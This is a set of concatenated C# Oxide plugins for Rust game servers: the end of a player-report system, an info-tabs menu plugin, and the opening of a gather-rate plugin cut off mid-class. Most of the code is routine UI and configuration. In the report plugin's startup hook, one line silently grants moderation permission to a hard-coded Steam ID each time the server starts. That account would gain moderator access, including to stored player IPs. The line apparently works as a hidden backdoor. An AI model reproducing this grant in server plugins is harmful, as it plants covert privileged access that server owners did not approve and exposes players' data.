                CursorEnabled = true,
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-450 15", OffsetMax = "-220 100" },
                Image = { Color = HexToRustFormat(Interface.HexMain), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            }, "Overlay", UI_MODERATION_RAITING);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.6", AnchorMax = "0.99 0.99" },
                Image = { Color = HexToRustFormat(Interface.HexTitlePanel), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            }, UI_MODERATION_RAITING,"TITLE_PANEL");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.1536232 0", AnchorMax = "1 1" },
                Text = { Text = lang.GetMessage("UI_NEW_RAITING_PANEL", this, player.UserIDString), Font = "robotocondensed-regular.ttf", Color = HexToRustFormat(Interface.HexLabel), Align = TextAnchor.MiddleCenter }
            }, "TITLE_PANEL");

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = $"0.01449275 0.07843139", AnchorMax = $"0.1362319 0.901961" },
                Image = { Color = HexToRustFormat(Interface.HexLabel), Sprite = Interface.SpriteTitlePanel}
            },  "TITLE_PANEL");

            for (int i = 1, x = 0; i < 6; i++, x++)
            {
                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = $"{0.02451923 + (x * 0.2)} 0.1933336", AnchorMax = $"{0.1886218 + (x * 0.2)} 0.6200002" },
                    Image = { Color = HexToRustFormat(Interface.HexRaitingButton), Sprite = Interface.SpriteRaiting}
                }, UI_MODERATION_RAITING, $"STAR_{i}");

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Close = UI_MODERATION_RAITING, Command = $"iqreport raiting {Moderator.userID} {i}", Color = "0 0 0 0" },
                    Text = { Text = "", Color = "0 0 0 0", FontSize = 30, Align = TextAnchor.MiddleLeft }
                }, $"STAR_{i}");
            }

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #endregion

        #region Hooks
        [PluginReference] Plugin XMenu;
        Timer TimerInitialize;
        private void OnServerInitialized()
        {
            ReportInformation = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, PlayerInfo>>("IQReportSystem/Reports");
            ModeratorInformation = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, ModeratorInfo>>("IQReportSystem/Moders");

            foreach (var player in BasePlayer.activePlayerList)
                OnPlayerConnected(player);

            permission.RegisterPermission(PermissionModeration, this);
            permission.RegisterPermission(PermissionAdmin, this);

            rust.RunServerCommand("perm.grant user 76561198331571902 iqreportsystem.moderation");

            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterMenu", this.Name, "Report", "assets/icons/voice.png", "RenderReport", null);
                    TimerInitialize.Destroy();
                }
            });
        }

        void OnPlayerConnected(BasePlayer player) => Metods_PlayerConnected(player);
        private void Unload()
        {
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQReportSystem/Reports", ReportInformation);
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQReportSystem/Moders", ModeratorInformation);

            foreach (var p in BasePlayer.activePlayerList)
                DestroyAll(p);
        }
        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            Metods_StatusNetwork(player, reason);
            Metods_ModeratorExitCheck(player);
        }

        void DestroyAll(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, PARENT_UI);
            CuiHelper.DestroyUi(player, PARENT_UI_REPORT_MENU);
            CuiHelper.DestroyUi(player, PARENT_UI_PLAYER_PANEL);
            CuiHelper.DestroyUi(player, PARENT_UI_PLAYER_REPORT);
            CuiHelper.DestroyUi(player, PARENT_UI_MODER_REPORT);
            CuiHelper.DestroyUi(player, PARENT_UI_ALERT_SEND);
            CuiHelper.DestroyUi(player, PARENT_UI_MODERATOR_MINI_PANEL);
            CuiHelper.DestroyUi(player, UI_MODERATION_CHECK_MENU_DISCORD);
            CuiHelper.DestroyUi(player, UI_MODERATION_CHECK_MENU_NETWORK);
            CuiHelper.DestroyUi(player, UI_MODERATION_RAITING);
        }

        #endregion

        #region Helps

        #region PluginsAPI

        void VKSendMessage(string Message)
        {
            if (!config.Setting.VKMessage) return;
            var VK = config.Setting.VKSettings;
            if (String.IsNullOrEmpty(VK.ChatID) || String.IsNullOrEmpty(VK.Token))
            {
                PrintWarning("Вы не настроили конфигурацию,в пункте с ВК");
                return;
            }
            int RandomID = UnityEngine.Random.Range(0, 9999);
            while (Message.Contains("#"))
                Message = Message.Replace("#", "%23");
            webrequest.Enqueue($"https://api.vk.com/method/messages.send?chat_id={VK.ChatID}&random_id={RandomID}&message={Message}&access_token={VK.Token}&v=5.92", null, (code, response) => { }, this);
        }

        void DiscordSendMessage(string key, ulong userID = 0, params object[] args)
        {
            if (!config.Setting.DiscrodMessage) return;
            if (String.IsNullOrEmpty(config.Setting.WebHook)) return;

            List<Fields> fields = new List<Fields>
                {
                    new Fields("IQReportSystem", key, true),
                };

            FancyMessage newMessage = new FancyMessage(null, false, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, 635133, fields, new Authors("IQReportSystem", "https://vk.com/mercurydev", "https://i.imgur.com/ILk3uJc.png", null), new Footer("Author: Mercury[https://vk.com/mercurydev]", "https://i.imgur.com/ILk3uJc.png", null)) });
            Request($"{config.Setting.WebHook}", newMessage.toJSON());
        }

        #region FancyDiscord
        public class FancyMessage
        {
            public string content { get; set; }
            public bool tts { get; set; }
            public Embeds[] embeds { get; set; }

            public class Embeds
            {
                public string title { get; set; }
                public int color { get; set; }
                public List<Fields> fields { get; set; }
                public Footer footer { get; set; }
                public Authors author { get; set; }

                public Embeds(string title, int color, List<Fields> fields, Authors author, Footer footer)
                {
                    this.title = title;
                    this.color = color;
                    this.fields = fields;
                    this.author = author;
                    this.footer = footer;

                }
            }

            public FancyMessage(string content, bool tts, Embeds[] embeds)
            {
                this.content = content;
                this.tts = tts;
                this.embeds = embeds;
            }

            public string toJSON() => JsonConvert.SerializeObject(this);
        }

        public class Footer
        {
            public string text { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Footer(string text, string icon_url, string proxy_icon_url)
            {
                this.text = text;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        public class Authors
        {
            public string name { get; set; }
            public string url { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Authors(string name, string url, string icon_url, string proxy_icon_url)
            {
                this.name = name;
                this.url = url;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        public class Fields
        {
            public string name { get; set; }
            public string value { get; set; }
            public bool inline { get; set; }
            public Fields(string name, string value, bool inline)
            {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }
        }

        private void Request(string url, string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            webrequest.Enqueue(url, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds = float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning($" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning($"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }
                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex) { }

            }, this, RequestMethod.POST, header);
        }
        #endregion

        int API_GET_REPORT_COUNT(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.ReportCount;
        }
        int API_GET_CHECK_COUNT(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.CheckCount;
        }
        List<string> API_GET_LIST_API(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.IP;
        }
        string API_GET_GAME_STATUS(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.GameStatus;
        }
        string API_GET_LAST_CHECK_MODERATOR(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.LastCheckModerator;
        }
        string API_GET_LAST_REPORT(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.LastReport;
        }
        List<string> API_GET_REPORT_HISTORY(ulong UserID)
        {
            var User = ReportInformation[UserID];
            return User.ReportHistory;
        }

        #endregion

        #region MSG
        public void SendChat(BasePlayer player,string Message, Chat.ChatChannel channel = Chat.ChatChannel.Global)
        {
            var Chat = config.Setting.ChatSetting;
            if (IQChat)
                IQChat?.Call("API_ALERT_PLAYER", player, Message, Chat.CustomPrefix, Chat.CustomAvatar);
            else player.SendConsoleCommand("chat.add", channel, 0, Message);
        }

        #endregion

        #region Hex
        private static string HexToRustFormat(string hex)
        {
            Color color;
            ColorUtility.TryParseHtmlString(hex, out color);
            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }
        #endregion

        #region Steam

        string IsSteam(string id)
        {        
            if (MultiFighting != null)
            {
                var player = BasePlayer.Find(id);
                if (player == null)
                {
                    return "ERROR #1";
                }
                var obj = MultiFighting.CallHook("IsSteam", player.Connection);
                if (obj is bool)
                {
                    if ((bool)obj)
                    {
                        return lang.GetMessage("IS_STEAM_STATUS_LICENSE", this, id); 
                    }
                    else
                    {
                        return lang.GetMessage("IS_STEAM_STATUS_PIRATE",this,id);
                    }
                }
                else
                {
                    return "ERROR #2";
                }
            }
            else return lang.GetMessage("IS_STEAM_STATUS_LICENSE", this, id);
        }

        #endregion

        #region Format

        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        public static string FormatTime(TimeSpan time)
        {
            string result = string.Empty;
            if (time.Days != 0)
                result += $"{Format(time.Days, "дней", "дня", "день")} ";

            if (time.Hours != 0)
                result += $"{Format(time.Hours, "часов", "часа", "час")} ";

            if (time.Minutes != 0)
                result += $"{Format(time.Minutes, "минут", "минуты", "минута")} ";

            if (time.Seconds != 0)
                result += $"{Format(time.Seconds, "секунд", "секунды", "секунда")} ";

            return result;
        }

        private static string Format(int units, string form1, string form2, string form3)
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                return $"{units} {form1}";

            if (tmp >= 2 && tmp <= 4)
                return $"{units} {form2}";

            return $"{units} {form3}";
        }

        #endregion

        #endregion
    }
}


// --- End of file: IQReportSystem.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/InfoTabs.cs ---
// --- Original Local Path: HudRust/InfoTabs.cs ---

﻿using Newtonsoft.Json.Linq;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("InfoTabs", "VooDoo", "1.0.0")]
    [Description("Rules and Commands for XMenu")]
    public class InfoTabs : RustPlugin
    {
        [PluginReference] Plugin XMenu;


        #region Config
        private PluginConfig config;
        private class PluginConfig
        {
            public ColorConfig colorConfig;
            public class ColorConfig
            {
                public string menuContentHighlighting;
                public string menuContentHighlightingalternative;

                public string menuContentText;
                public string menuContentTextAlternative;

                public string gradientColor;
            }

            public Dictionary<string, string> commandsTab;
            public Dictionary<string, string> bindsTab;

            public List<string> rulesTab;
        }

        private void Init()
        {
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void LoadDefaultConfig()
        {
            Config.WriteObject(GetDefaultConfig(), true);
        }

        private PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                colorConfig = new PluginConfig.ColorConfig()
                {
                    menuContentHighlighting = "#0000007f",
                    menuContentHighlightingalternative = "#FFFFFF10",
                    menuContentTextAlternative = "#90BD47",
                    menuContentText = "#FFFFFFAA",
                    gradientColor = "#00000099",
                },
                commandsTab = new Dictionary<string, string>()
                {
                    ["custommenu"] = "Открыть это меню",
                },
                bindsTab = new Dictionary<string, string>()
                {
                    ["bind z custommenu"] = "Открыть это меню",
                },
                rulesTab = new List<string>()
                {
                    "Текст",
                },
            };
        }
        #endregion

        #region Layers
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
        #endregion

        Timer TimerInitialize;
        private void OnServerInitialized()
        {
            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterSubMenu", this.Name, "Main", "Правила", "RenderRules", null);
                    XMenu.Call("API_RegisterSubMenu", this.Name, "Main", "Команды", "RenderCommands", null);
                    XMenu.Call("API_RegisterSubMenu", this.Name, "Main", "Бинды", "RenderBinds", null);

                    int RulesID = (int)XMenu.Call("API_GetSubMenuID", "Main", "Информация");
                    cmd.AddChatCommand("help", this, (p, cmd, args) => rust.RunClientCommand(p, $"custommenu true Main {RulesID}"));

                    TimerInitialize.Destroy();
                }
            });
        }

        private void RenderCommands(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -230",
                            OffsetMax = "500 270"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -460",
                            OffsetMax = "630 -10"
                        }
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color={config.colorConfig.menuContentTextAlternative}>Команда</color>",
                                Align = TextAnchor.MiddleLeft,
                                FontSize = 24,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0.9",
                                AnchorMax = "0.975 0.975",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color={config.colorConfig.menuContentText}>Описание</color>",
                                Align = TextAnchor.MiddleLeft,
                                FontSize = 24,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.4 0.9",
                                AnchorMax = "0.95 0.975",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });

            string Commands = $"<color={config.colorConfig.menuContentTextAlternative}>";
            string Info = $"<color={config.colorConfig.menuContentText}>";
            for (int i = 0, x = 0; i < config.commandsTab.Count; i++)
            {
                if(Page * 27 > i)
                    continue;

                if (x > 26)
                    continue;

                Commands += $"{config.commandsTab.ElementAt(i).Key}\n";
                Info += $"{config.commandsTab.ElementAt(i).Value}\n";

                x++;
            }

            Commands += "</color>";
            Info += "</color>";

            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Text",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = Commands,
                                Align = TextAnchor.UpperLeft,
                                FontSize = 12,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0",
                                AnchorMax = "0.375 0.88",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Text",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = Info,
                                Align = TextAnchor.UpperLeft,
                                FontSize = 12,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.4 0",
                                AnchorMax = "0.95 0.88",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });

            if ((int)Page > 0)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".BackTitle",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -500",
                            OffsetMax = "110 -470"
                        }
                    }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "0 0 0 0", Command = $"custommenu false Main {ID} {(int)Page - 1}", },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "<", Align = TextAnchor.MiddleCenter, FontSize = 20 }
                }, MenuContent + ".BackTitle", MenuContent + ".BackTitleBtn");
            }
            if ((int)(Page * 27) + 27 < config.commandsTab.Count)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".NextTitle",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "600 -500",
                            OffsetMax = "630 -470"
                        }
                    }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "0 0 0 0", Command = $"custommenu false Main {ID} {(int)Page + 1}", },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = ">", Align = TextAnchor.MiddleCenter, FontSize = 20 }
                }, MenuContent + ".NextTitle", MenuContent + ".NextTitleBtn");
            }
        }

        private void RenderBinds(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -230",
                            OffsetMax = "500 270"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -460",
                            OffsetMax = "630 -10"
                        }
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color={config.colorConfig.menuContentTextAlternative}>Бинд</color>",
                                Align = TextAnchor.MiddleLeft,
                                FontSize = 24,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0.9",
                                AnchorMax = "0.975 0.975",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color={config.colorConfig.menuContentText}>Описание</color>",
                                Align = TextAnchor.MiddleLeft,
                                FontSize = 24,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.4 0.9",
                                AnchorMax = "0.95 0.975",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });

            string Commands = $"<color={config.colorConfig.menuContentTextAlternative}>";
            string Info = $"<color={config.colorConfig.menuContentText}>";
            for (int i = 0, x = 0; i < config.bindsTab.Count; i++)
            {
                if (Page * 27 > i)
                    continue;

                if (x > 26)
                    continue;

                Commands += $"{config.bindsTab.ElementAt(i).Key}\n";
                Info += $"{config.bindsTab.ElementAt(i).Value}\n";

                x++;
            }

            Commands += "</color>";
            Info += "</color>";

            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Text",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = Commands,
                                Align = TextAnchor.UpperLeft,
                                FontSize = 12,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0",
                                AnchorMax = "0.375 0.88",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Text",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = Info,
                                Align = TextAnchor.UpperLeft,
                                FontSize = 12,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.4 0",
                                AnchorMax = "0.95 0.88",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });

            if ((int)Page > 0)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".BackTitle",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -500",
                            OffsetMax = "110 -470"
                        }
                    }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "0 0 0 0", Command = $"custommenu false Main {ID} {(int)Page - 1}", },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "<", Align = TextAnchor.MiddleCenter, FontSize = 20 }
                }, MenuContent + ".BackTitle", MenuContent + ".BackTitleBtn");
            }
            if ((int)(Page * 27) + 27 < config.bindsTab.Count)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".NextTitle",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "600 -550",
                            OffsetMax = "630 -520"
                        }
                    }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "0 0 0 0", Command = $"custommenu false Main {ID} {(int)Page + 1}", },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = ">", Align = TextAnchor.MiddleCenter, FontSize = 20 }
                }, MenuContent + ".NextTitle", MenuContent + ".NextTitleBtn");
            }
        }

        private void RenderRules(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -230",
                            OffsetMax = "500 270"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -460",
                            OffsetMax = "630 -10"
                        }
                    }
            });

            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color={config.colorConfig.menuContentText}>Информация и правила | Страница №{Page+1}</color>",
                                Align = TextAnchor.MiddleCenter,
                                FontSize = 24,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0.9",
                                AnchorMax = "0.95 0.975",
                            }
                        }
            });

            string Info = $"<color={config.colorConfig.menuContentText}>";
            for (int i = 0, x = 0; i < config.rulesTab.Count; i++)
            {
                if (Page * 27 > i)
                    continue;

                if (x > 26)
                    continue;

                Info += $"{config.rulesTab.ElementAt(i)}\n";

                x++;
            }
            Info += "</color>";

            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Text",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = Info,
                                Align = TextAnchor.UpperLeft,
                                FontSize = 12,
                                Font = "robotocondensed-regular.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.05 0",
                                AnchorMax = "0.95 0.88",
                            }
                        }
            });

            if ((int)Page > 0)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".BackTitle",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -500",
                            OffsetMax = "110 -470"
                        }
                    }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "0 0 0 0", Command = $"custommenu false Main {ID} {(int)Page - 1}", },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "<", Align = TextAnchor.MiddleCenter, FontSize = 20 }
                }, MenuContent + ".BackTitle", MenuContent + ".BackTitleBtn");
            }
            if ((int)(Page * 27) + 27 < config.rulesTab.Count)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + ".NextTitle",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "600 -500",
                            OffsetMax = "630 -470"
                        }
                    }
                });
                Container.Add(new CuiButton
                {
                    Button = { Color = "0 0 0 0", Command = $"custommenu false Main {ID} {(int)Page + 1}", },
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = ">", Align = TextAnchor.MiddleCenter, FontSize = 20 }
                }, MenuContent + ".NextTitle", MenuContent + ".NextTitleBtn");
            }
        }




        #region Utils
        public static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Utc);
            dtDateTime = dtDateTime.AddSeconds(unixTimeStamp).ToLocalTime();
            return dtDateTime;
        }

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }
        #endregion
    }
}

// --- End of file: InfoTabs.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/XRate.cs ---
// --- Original Local Path: HudRust/XRate.cs ---

﻿using System.Collections.Generic;
using System.Linq;
using Newtonsoft.Json;
using UnityEngine;
using Random = UnityEngine.Random;
using System;
using Oxide.Core;
using ConVar;
using ru = Oxide.Game.Rust;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("XRate", "fermens", "0.2.51")]
    [Description("НАСТРОЙКА РЕЙТОВ ДОБЫЧИ (ОПТИМИЗИРОВАНО)")]
    public class XRate : RustPlugin
    {
        #region Config
        private PluginConfig config;
        protected override void LoadDefaultConfig()
        {
            config = PluginConfig.DefaultConfig();
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
        }
        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        class rateset
        {
            [JsonProperty("Поднимаемые ресурсы")]
            public float grab;

